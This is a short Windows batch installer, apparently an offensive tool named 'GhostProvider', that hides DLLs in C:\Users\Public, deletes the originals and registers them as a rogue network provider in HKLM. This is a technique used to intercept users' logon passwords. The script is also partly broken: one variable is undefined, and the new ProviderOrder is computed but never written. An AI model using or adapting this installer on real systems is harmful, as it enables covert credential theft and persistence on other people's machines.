@echo off

echo   _____ _               _  ______               _     _           
echo  ^|  __ \ ^|             ^| ^| ^| ___ \             (_)   ^| ^|          
echo  ^| ^|  \/ ^|__   ___  ___^| ^|_^| ^|_/ / __ _____   ___  __^| ^| ___ _ __ 
echo  ^| ^| __^| '_ \ / _ \/ __^| __^|  __/ '__/ _ \ \ / / ^|/ _` ^|/ _ \ '__^|
echo  ^| ^|_\ \ ^| ^| ^| (_) \__ \ ^|_^| ^|  ^| ^| ^| (_) \ V /^| ^| (_^| ^|  __/ ^|   
echo   \____/_^| ^|_^|\___/^|___/\__\_^|  ^|_^|  \___/ \_/ ^|_^|\____^|\___^|_^|
echo/
echo                        DLL Network Provider


set directorioActual = %cd%

copy /Y "%cd%\*.dll" "C:\Users\Public" 

del /f /q "%cd%\*.dll"

set nombreNetworkProvider=NPWashuleru
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%nombreNetworkProvider%" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%nombreNetworkProvider%\NetworkProvider" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%nombreNetworkProvider%\NetworkProvider" /v Class /t REG_DWORD /d 2 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%nombreNetworkProvider%\NetworkProvider" /v Name /t REG_SZ /d %NetworkProviderName% /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%nombreNetworkProvider%\NetworkProvider" /v ProviderPath /t REG_EXPAND_SZ /d C:\Users\Public\%nombreNetworkProvider% /f

for /f "tokens=2*" %%A in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" /v ProviderOrder') do set ProviderOrder=%%B
set NewProviderOrder=%ProviderOrder%,%nombreNetworkProvider%

echo Archivo ejecutado.
